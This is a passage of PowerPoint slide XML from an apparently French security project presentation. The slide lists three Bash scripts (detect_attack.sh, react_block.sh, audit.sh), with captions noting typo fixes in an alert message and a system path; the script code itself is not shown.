                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F62C384-6F51-CA14-B8C0-D3E284D4AE5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="579119" y="102870"/>
            <a:ext cx="7199543" cy="580644"/>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500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="201"/>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203"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="203"/>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202"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="202"/>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204"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="20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P spid="201" grpId="0"/>
      <p:bldP spid="202" grpId="0" animBg="1"/>
      <p:bldP spid="20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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="384048"/>
            <a:ext cx="10058400" cy="2926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9E5E"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>DÉVELOPPEMENT DES SCRIPTS</a:t>
            </a:r>
            <a:endParaRPr sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="296" name="Google Shape;296;p17"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>cripts Bash</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1500000"/>
            <a:ext cx="3498240" cy="320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F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>detect_attack.sh</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Google Shape;298;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1820000"/>
            <a:ext cx="3498240" cy="460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en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Écriture initiale, puis relecture attentive du script</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="299" name="Google Shape;299;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2350000"/>
            <a:ext cx="3498240" cy="4130000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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00" name="Google Shape;300;p17"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="678640" y="3262080"/>
            <a:ext cx="3238240" cy="2005838"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Google Shape;301;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="678640" y="5880000"/>
            <a:ext cx="3238240" cy="300000"/>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Clr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Script corrigé, prêt à être exécuté</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4346880" y="1500000"/>
            <a:ext cx="3498240" cy="320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F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>react_block.sh</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="303" name="Google Shape;303;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4346880" y="1820000"/>
            <a:ext cx="3498240" cy="460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en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Coquille repérée dans le message d’alerte</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Google Shape;304;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4346880" y="2350000"/>
            <a:ext cx="3498240" cy="4130000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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05" name="Google Shape;305;p17"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4476880" y="3096828"/>
            <a:ext cx="3238240" cy="2336342"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;306;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4476880" y="5880000"/>
            <a:ext cx="3238240" cy="300000"/>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Clr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>« BLOGAGE » corrigé en « BLOCAGE »</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="307" name="Google Shape;307;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8145120" y="1500000"/>
            <a:ext cx="3498240" cy="320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F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>audit.sh</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8145120" y="1820000"/>
            <a:ext cx="3498240" cy="460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en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Chemin système mal orthographié, corrigé</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="309" name="Google Shape;309;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8145120" y="2350000"/>
            <a:ext cx="3498240" cy="4130000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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10" name="Google Shape;310;p17"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275120" y="3111798"/>
            <a:ext cx="3238240" cy="2306402"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Google Shape;311;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275120" y="5880000"/>
            <a:ext cx="3238240" cy="300000"/>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Clr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>« /ets/passwd » corrigé en « /etc/passwd »</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="312" name="Google Shape;312;p17"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>11</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none"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fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29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8"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29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7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29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2"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="16" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30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3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30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7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30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08"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="308"/>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299"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="299"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="31" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="300"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="300"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="34" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="305"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="36" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="305"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="37" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="304"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="39" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="304"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="40" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="41" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="306"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="306"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="43" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="301"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="45" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="301"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="46" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="310"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="48" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="310"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="49" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="50" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="309"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
